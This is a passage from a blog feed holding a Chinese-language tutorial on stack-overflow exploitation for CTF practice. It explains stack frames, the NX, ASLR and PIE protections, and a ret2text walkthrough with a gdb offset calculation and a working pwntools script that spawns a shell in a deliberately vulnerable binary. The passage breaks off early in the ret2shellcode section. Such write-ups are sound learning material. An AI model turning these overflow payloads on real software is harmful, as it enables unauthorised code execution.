    <category term="WriteUp" scheme="https://blog.boychai.xyz/tags/WriteUp/"/>
    
    <category term="Forensics" scheme="https://blog.boychai.xyz/tags/Forensics/"/>
    
  </entry>
  
  <entry>
    <title>PWN-栈系列总结</title>
    <link href="https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"/>
    <id>https://blog.boychai.xyz/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/</id>
    <published>2025-05-11T19:34:00.000Z</published>
    <updated>2025-07-17T05:40:18.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈基础知识"><a href="#栈基础知识" class="headerlink" title="栈基础知识"></a>栈基础知识</h1><h2 id="栈基础概念"><a href="#栈基础概念" class="headerlink" title="栈基础概念"></a>栈基础概念</h2><p>栈是程序运行时的一块区域，主要用于存储临时数据、管理函数调用和返回地址。他有很多的特点，他是一种后进先出的数据结构，操作主要有压栈与出栈两种，并且在程序的内存中他的数据是从高地址往低地址走的。简单说，就是程序运行时的“临时记事本”。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510144043.png"></p><h2 id="栈顶与栈底"><a href="#栈顶与栈底" class="headerlink" title="栈顶与栈底"></a>栈顶与栈底</h2><p>对于栈有两个比较重要的寄存器，一个是栈顶一个是栈顶，在32位操作系统中，寄存器EBP表示栈底，ESP表示栈顶。栈底代表当前栈的最开始的位置，栈顶很好理解，就是栈的最顶部，在操作栈的时候主要分为压栈和出栈，具体是下面两个汇编指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebx  <span class="comment"># 压栈，ebx的数据压入栈顶，并且ESP(栈顶) + size</span></span><br><span class="line">pop edx   <span class="comment"># 出栈，将栈顶数据放置到edx中，并且ESP(栈顶) - size </span></span><br></pre></td></tr></table></figure><p>具体参考图如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510153227.png"></p><p>这两个操作都是基于栈顶的位置进行操作，并且操作的时候会修改栈顶(ESP)的指向位置。</p><h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p>上面说栈主要是用来存储临时数据、管理函数调用和返回地址，可以参考下面程序的调用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> c = sum(a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下面命令编译出32位可执行程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -S -fno-asynchronous-unwind-tables -masm=intel main.c -o main.asm</span><br></pre></td></tr></table></figure><p>通过IDA可以拿到下面汇编指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;main.c&quot;</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">.text</span><br><span class="line">.globlsum</span><br><span class="line">.typesum, @function</span><br><span class="line">sum:</span><br><span class="line">pushebp</span><br><span class="line">movebp, esp</span><br><span class="line">call__x86.get_pc_thunk.ax</span><br><span class="line">addeax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_</span><br><span class="line">movedx, DWORD PTR 8[ebp]</span><br><span class="line">moveax, DWORD PTR 12[ebp]</span><br><span class="line">addeax, edx</span><br><span class="line">popebp</span><br><span class="line">ret</span><br><span class="line">.sizesum, .-sum</span><br><span class="line">.globlmain</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">pushebp</span><br><span class="line">movebp, esp</span><br><span class="line">subesp, 16</span><br><span class="line">call__x86.get_pc_thunk.ax</span><br><span class="line">addeax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_</span><br><span class="line">movDWORD PTR -4[ebp], 1</span><br><span class="line">movDWORD PTR -8[ebp], 2</span><br><span class="line">pushDWORD PTR -8[ebp]</span><br><span class="line">pushDWORD PTR -4[ebp]</span><br><span class="line">callsum</span><br><span class="line">addesp, 8</span><br><span class="line">movDWORD PTR -12[ebp], eax</span><br><span class="line">moveax, 0</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">.sizemain, .-main</span><br><span class="line">.section.text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat</span><br><span class="line">.globl__x86.get_pc_thunk.ax</span><br><span class="line">.hidden__x86.get_pc_thunk.ax</span><br><span class="line">.type__x86.get_pc_thunk.ax, @function</span><br><span class="line">__x86.get_pc_thunk.ax:</span><br><span class="line">moveax, DWORD PTR [esp]</span><br><span class="line">ret</span><br><span class="line">.ident&quot;GCC: (Debian 14.2.0-19) 14.2.0&quot;</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于当前学习的栈来说，还不需要过度的去解读汇编指令，比较重要的部分主要是main函数的下面指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">pushebp</span><br><span class="line">movebp, esp</span><br><span class="line">......</span><br><span class="line">callsum</span><br><span class="line">addesp, 8</span><br><span class="line">......</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>还有sum函数的下面指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum:</span><br><span class="line">pushebp</span><br><span class="line">movebp, esp</span><br><span class="line">......</span><br><span class="line">poprbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>C语言函数被编译之后起初的两个汇编指令都会是下面两条指令来初始化自己的栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushebp</span><br><span class="line">movebp, esp</span><br></pre></td></tr></table></figure><p><code>push ebp</code>即把EBP压入当前的栈中，<code>mov ebp,esp</code>把当前的esp(栈顶)当作当前函数的ebp(栈底)，这一步的作用是给当前函数基于当前栈数据高一块新的栈位置，即栈内数据是当前函数的，做一个分割。在main函数中，最初的寄存器都是由系统基于函数调用约定自动给布局的，所以当前可以先不在意这一部分，重点看main的<code>call</code>指令，他这里调用了sum函数，实际是干了两个事情，他会把当前的EIP寄存器压入栈顶，然后把EIP寄存器指向sum函数的地址，其中EIP的作用是当前命令执行的位置，call指令执行前之前可以参考下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510183255.png"><br>进入sum函数之后先初始化栈去执行<code>push ebp</code>和<code>mov ebp,esp</code>，具体参考图如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510182553.png"><br>执行过后的栈内容除了上一个函数的栈底之外已经没有内容了，当前栈中的内容全部都是当前函数的一个栈数据区域。我们继续看执行<code>pop ebp</code>和<code>ret</code>干了什么，如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250510184345.png"><br><code>pop ebp</code>恢复了父函数<code>main</code>的rbp，<code>ret</code>恢复了父函数call之后的<code>eip</code>即运行指针。后续就是main函数结束运行了。对于栈漏洞主要是围绕上面操作进行的，尤其是<code>ret</code>指令，需要深入的理解这一个过程。</p><h1 id="系统防护"><a href="#系统防护" class="headerlink" title="系统防护"></a>系统防护</h1><p>这一部分可以先跳过，直接去看简单栈溢出，这里是对系统防护我自己的一些总结和思考<br>，在下面章节做题遇到防护可以返回当前板块查看。</p><h2 id="NX防护"><a href="#NX防护" class="headerlink" title="NX防护"></a>NX防护</h2><p><code>NX</code>防护，全称<code>The No-eXecute bits</code>，程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现。<br>它通过在内存页的标识中增加“执行”位，可以表示该内存页是否可以执行，若程序代码的EIP执行至不可运行的内存页，则CPU将直接拒绝执行“命令”造成程序崩溃。大白话就是在程序运行的时候，哪些位置可以执行，哪些不可以执行都给标注好了，如果这个开启的话那么一般就不会出现通过自己构造shellcode到内存中执行。典型题目<code>ret2shellcode</code>，他的这个防护是没有开启的，并且这道题目还对内核有要求。如果在用gcc编译程序的时候想要关闭nx防护可以添加参数<code>-z execstack</code>。</p><h2 id="ASLR防护"><a href="#ASLR防护" class="headerlink" title="ASLR防护"></a>ASLR防护</h2><p>全称<code>Address Space Layout Randomization</code>，系统的防护措施，他的主要作用是随机化内存中的地址，一个程序，运行多次，某个内容每一次运行的内存地址都不相同，程序装载时生效。默认系统中应该是开启的，具体验证方式如下<br>查看系统文件<code>/proc/sys/kernel/randomize_va_space</code>，如果是0则就是没有随机化的，也就是ASLR是关闭状态。如果是1，那么就是保留的随机化，他的共享库、栈、mmap()、以及VDSO将被随机化。如果等于2，那么就是完全的随机化，在保留的随机化(状态为1时)的基础上，通过br()分配的内存空间也将被随机化。</p><h3 id="为什么开启了ASLR有些地址还是可以直接使用？"><a href="#为什么开启了ASLR有些地址还是可以直接使用？" class="headerlink" title="为什么开启了ASLR有些地址还是可以直接使用？"></a>为什么开启了ASLR有些地址还是可以直接使用？</h3><p>在启用了 ASLR（地址空间布局随机化）的系统中，不同的内存区域会受到不同程度的随机化影响。其中会直接受到ASLR的影响的如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈、堆、共享库</span><br></pre></td></tr></table></figure><p>受ASLR影响较小的内存区域，相对稳定不会更变地址的如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt表、got表、代码段(text段)、全局变量(data段)、静态数据段(bss段)、TLS</span><br></pre></td></tr></table></figure><h2 id="PIE防护"><a href="#PIE防护" class="headerlink" title="PIE防护"></a>PIE防护</h2><p>PIE防护主要是给EIF到内存加载过程中，bss、text、data这些段的随机化，如果PIE开启的话这些的地址也会被随机化。</p><h3 id="PIE与ASLR的关系"><a href="#PIE与ASLR的关系" class="headerlink" title="PIE与ASLR的关系"></a>PIE与ASLR的关系</h3><p>ASLR 随机的是加载地址，它需要 PIE 的配合才能让 .text&#x2F;.data&#x2F;.bss 被随机，如果程序不是 PIE，text 是固定的，不会被 ASLR 动<br>PIE 是编译出来的位置无关代码，它只是让 ASLR 能够生效在主程序段上（包括 text&#x2F;bss&#x2F;data）<br>然后libc中内置的函数本身就是PIE的，他们编译都会带着个东西。</p><h1 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a>简单栈溢出</h1><h2 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h2><p>在上面可以了解到在函数调用之后需要通过<code>ret</code>修改EIP寄存器，EIP这个寄存器非常重要，他指向的内容就是他后续执行的命令，在栈中如果可以通过某些办法修改ret的返回地址，就可以做到控制程序执行流的效果。栈溢出是指在一个程序中，本身栈可能就只有10空间的大小，而通过函数读取数据的时候读入了大于10的数据量就会产生栈溢出，如果溢出的位置达到了ret的返回地址那么我们就可以实现上述的控制执行流的效果。加单举个栈溢出的例子，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, a, <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">if</span> (b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈溢出成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里向里面输入11个<code>1</code>或者10个<code>1</code>都会输出栈溢出成功，输入10个也可以成功的原因是因为发送时回车也会占用空间，所以10个数据也会造成栈溢出，正常来说b应该是0即false，就不会进行输出，这里通过读取11个字符到a变量中发生栈溢出修改b为非零即true，触发if进行输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/总结/栈溢出]</span><br><span class="line">└─# ./main</span><br><span class="line">1111111111</span><br><span class="line">栈溢出成功</span><br></pre></td></tr></table></figure><p>后面会看几道相关的例题分别是ret2text、ret2shellcode、ret2syscall。</p><h2 id="ROP-导向编程"><a href="#ROP-导向编程" class="headerlink" title="ROP-导向编程"></a>ROP-导向编程</h2><p>目前被广泛使用的攻击手法是 返回导向编程 (Return Oriented Programming)，其主要思想是在 栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。后续基本都是围绕着这个攻击手法进行，通过一次修改ret的地址控制整个的执行流程。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a><br>PS：内容来自于CTF-WIKI</p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2text</span><br><span class="line">ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>程序类型位32位ELF文件</p><h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=ret2text</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols        No    0               2               ret2text</span><br></pre></td></tr></table></figure><p>防护措施好像就有个NX，NX是不允许在堆栈中执行shellcode</p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>gets</code>往s里面传值了，但是s的长度是100，这里就是一个简单的栈溢出。之后还找到了一个程序后门，代码内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf((<span class="type">int</span>)&amp;unk_8048760, (<span class="type">int</span>)&amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于<code>system(/bin/sh)</code>他就是留下的后门。。这里看一下他的详细信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804863</span>A ; <span class="number">11</span>:     system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure><p>他的地址是<code>0804863A</code>。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>使用栈溢出把程序结束时的返回地址改成后门的执行地址也就是<code>0804863A</code>，但是栈需要溢出多少位还不知道需要动态分析一下。</p><h3 id="溢出长度"><a href="#溢出长度" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ gdb ret2text</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">hello</span><br><span class="line">25      <span class="keyword">in</span> ret2text.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffcf1c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcf88 ◂— 0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]─────────────────────────────────────────────────────────────</span><br><span class="line">  ......</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line">......</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────── </span><br><span class="line">......</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>这里只写一些重要的操作和一些重要输出，输出中重点内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*EAX  0xffffcf1c ◂— &#x27;hello&#x27;</span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcf88 ◂— 0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c ◂— &#x27;hello&#x27;</span><br><span class="line">*EIP  0x80486b3 (main+107) ◂— mov dword ptr [esp], 0x80487a4</span><br></pre></td></tr></table></figure><p>EBP和ESP的地址间隔是<code>0xffffcf88 - 0xffffcf1c</code>&#x3D; <code>4294954888 - 4294954780</code> &#x3D; 108(这里可以直接用<code>88h-1ch</code>初学为了好理解就写全了)，拿到间隔长度之后需要+4，因为要往返回地址中写内容，而返回地址的位置是再esp 的上面所以需要+4。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">返回地址</span><br><span class="line">============================</span><br><span class="line">%esp</span><br><span class="line">============================</span><br><span class="line">xxxxx</span><br><span class="line">============================</span><br></pre></td></tr></table></figure><h3 id="代码攻击"><a href="#代码攻击" class="headerlink" title="代码攻击"></a>代码攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">108</span> + <span class="number">4</span>) + p32(target)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>效果展示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ python test.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 35232</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">core  ret2text    run  test.py</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/kali/Desktop/pwn</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 35232)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="题目来源-1"><a href="#题目来源-1" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a><br>PS：内容来自于CTF-WIKI</p><h3 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h3><p>高版本的linux内核似乎已经修复了这个问题，目前只能尝试在<code>Ubuntu-18.04</code>或之前的版本可以 内核版本目前我用的是<code>5.4.0-84-generic</code>成功复现了这个题目。</p><h3 id="文件类型-1"><a href="#文件类型-1" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2shellcode</span><br><span class="line">ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not 